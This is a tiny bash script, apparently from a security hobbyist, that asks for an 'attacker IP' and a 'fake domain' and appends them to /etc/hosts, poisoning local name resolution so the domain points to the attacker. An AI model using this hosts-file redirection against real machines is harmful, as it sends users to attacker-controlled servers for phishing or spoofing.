#!/usr/bin/bash
# Author @nu11secur1ty-2019
# v-1.0

echo "type the attacker IP"
	read IP
echo "type the fake domain"
	read domain
echo -e "$IP   $domain" >> /etc/hosts
exit 0;
